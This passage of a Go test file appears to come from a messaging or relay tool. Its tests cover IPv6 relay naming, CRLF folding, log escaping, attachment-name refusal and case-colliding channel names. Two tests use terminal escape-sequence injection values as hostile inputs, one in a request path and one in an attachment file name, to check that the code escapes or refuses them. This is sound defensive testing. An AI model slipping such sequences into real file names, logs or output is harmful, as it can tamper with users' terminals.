	u, err := token.Parse(raw)
	if err != nil {
		t.Fatal(err)
	}
	s, err := store.Open(alice.home)
	if err != nil {
		t.Fatal(err)
	}
	if got := describeToken(s, u); !strings.Contains(got, "issuer:  ab\n") {
		t.Errorf("describeToken on a two-character issuer:\n%s", got)
	}
}

// auu relay add with an IPv6 literal for a host once spun for ever, since
// the relay's directory name was derived from the host and no suffix made
// a colon a valid name. Now the name is derived from the characters the
// rule allows and the command says what it chose.
func TestRelayAddNamesAnIPv6RelayAndReturns(t *testing.T) {
	relayURL := startRelay(t)
	alice := newUser(t, "alice", relayURL)
	var out string
	var err error
	done := make(chan struct{})
	go func() {
		out, err = alice.tryRun("relay", "add", "https://[::1]:8443")
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("auu relay add https://[::1]:8443 did not return within 10s")
	}
	if err != nil {
		t.Fatalf("relay add: %v\n%s", err, out)
	}
	if !strings.Contains(out, `added https://[::1]:8443 as "1"`) {
		t.Errorf("relay add printed:\n%s", out)
	}
}

// The string review at af0d96e: serve's reply text, the proxy's log, an
// extract refusal and the serve file's channel names.

// A handler on Windows prints CRLF, and serve built the reply's text from
// its output with no fold, so the text rule refused the reply for U+000D
// and the message was failed and retried with the answer on disk the
// whole time. output folds CRLF as the sender's own command does; a lone
// carriage return is left for the rule.
func TestServeFoldsAHandlersCRLFBeforeTheRule(t *testing.T) {
	path := filepath.Join(t.TempDir(), "out.txt")
	if err := os.WriteFile(path, []byte("The answer is yes.\r\nSee the attached patch.\r\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	text, has, err := output(path)
	if err != nil || !has {
		t.Fatalf("output() said the handler had nothing to say: %v", err)
	}
	if text != "The answer is yes.\nSee the attached patch." {
		t.Errorf("output() made %q of a CRLF reply", text)
	}
	if err := message.ValidText(text); err != nil {
		t.Errorf("the folded reply fails the text rule: %v", err)
	}
	if err := os.WriteFile(path, []byte("one\rtwo\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	text, _, _ = output(path)
	if err := message.ValidText(text); err == nil || !strings.Contains(err.Error(), "U+000D") {
		t.Errorf("a lone carriage return in a reply: %v, want the rule's refusal naming U+000D", err)
	}
}

// The key proxy's log line carried the request path as the socket sent it,
// decoded by net/http, so %1b on the wire was an ESC on serve's standard
// error; and the token tag was cut by bytes. Now the path is escaped and
// the tag cut by characters.
func TestKeyProxyLogEscapesTheRequestPath(t *testing.T) {
	var log strings.Builder
	p := &keyProxy{
		logf: func(format string, a ...any) { log.WriteString(fmt.Sprintf(format, a...) + "\n") },
		live: map[string]bool{},
	}
	req := httptest.NewRequest("GET", "/notatoken/%1b%5d0%3bowned%07", nil)
	p.ServeHTTP(httptest.NewRecorder(), req)
	for i := 0; i < len(log.String()); i++ {
		if c := log.String()[i]; c < 0x20 && c != '\n' {
			t.Errorf("the proxy's log line carries byte %#x from the request path: %q", c, log.String())
			break
		}
	}
	if !strings.Contains(log.String(), `\x1b]0;owned\a`) {
		t.Errorf("the log does not show the path escaped: %q", log.String())
	}
	log.Reset()
	req = httptest.NewRequest("GET", "/%E6%97%A5%E6%9C%AC%E8%AA%9E%E6%97%A5%E6%9C%AC%E8%AA%9E/v1/messages", nil)
	p.ServeHTTP(httptest.NewRecorder(), req)
	if !utf8.ValidString(log.String()) {
		t.Errorf("the proxy's log line is not valid UTF-8: %q; the first path element was cut by bytes", log.String())
	}
	if !strings.Contains(log.String(), "proxy: \u65e5\u672c\u8a9e\u65e5\u672c\u8a9e GET") {
		t.Errorf("a six-character element is not the tag whole: %q", log.String())
	}
	log.Reset()
	req = httptest.NewRequest("GET", "/"+strings.Repeat("%E6%97%A5", 12)+"/v1/messages", nil)
	p.ServeHTTP(httptest.NewRecorder(), req)
	if !strings.Contains(log.String(), "proxy: "+strings.Repeat("\u65e5", tokenShown)+" GET") || !utf8.ValidString(log.String()) {
		t.Errorf("a twelve-character element is not cut to %d characters: %q", tokenShown, log.String())
	}
}

// A refusal from extractInto or copyStreamed named the attachment with
// %s, and main prints the error as it came; the name is the very thing
// the refusal is about. Now the sentences use %q.
func TestAnExtractRefusalEscapesTheAttachmentName(t *testing.T) {
	s, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	name := "notes\x1b]0;owned\a.txt"
	m := &store.Stored{
		Relay: "relay",
		Inner: &envelope.Inner{
			ID:   strings.Repeat("a", 32),
			Time: time.Now(),
			Body: message.Body{
				Type: message.TypeNote, Thread: strings.Repeat("a", 32), Text: "hi",
				Attachments: []message.Attachment{{Name: name, Media: "text/plain", Size: 2, SHA256: strings.Repeat("0", 64), Data: []byte("hi")}},
			},
		},
	}
	_, err = extractInto(s, store.Inbox, m, t.TempDir())
	if err == nil {
		t.Fatal("extractInto wrote an attachment whose name carries an escape sequence")
	}
	if strings.ContainsRune(err.Error(), 0x1b) || !strings.Contains(err.Error(), `refusing to write "notes\x1b]0;owned\a.txt"`) {
		t.Errorf("the refusal from extractInto: %q", err.Error())
	}
}

// Each served channel is a directory under serve/channels/, so two names
// equal under case folding are one directory on macOS and Windows and
// would share one read-only base; serve check refuses the pair, naming
// both, as DistinctAttachmentNames refuses two attachment names.
func TestServeCheckRefusesChannelsThatFoldToOneDirectory(t *testing.T) {
	dir := repo(t)
	one := func() *serveChannel {
		return &serveChannel{Dir: dir, Exec: "cat", Mode: modeReadOnly, MaxTurns: 1}
	}
	cfg := &serveConfig{
		V:        1,
		path:     filepath.Join(t.TempDir(), "serve.json"),
		Channels: map[string]*serveChannel{"Bugs": one(), "bugs": one()},
	}
	err := cfg.check()
	if err == nil || !strings.Contains(err.Error(), `"Bugs" and "bugs" are one directory where case does not count`) {
		t.Errorf("a serve file naming channels Bugs and bugs: %v, want the refusal naming both", err)
	}
	cfg.Channels = map[string]*serveChannel{"bugs": one(), "builds": one()}
	if err := cfg.check(); err != nil {
		t.Errorf("two channels that are two directories were refused: %v", err)
	}
}
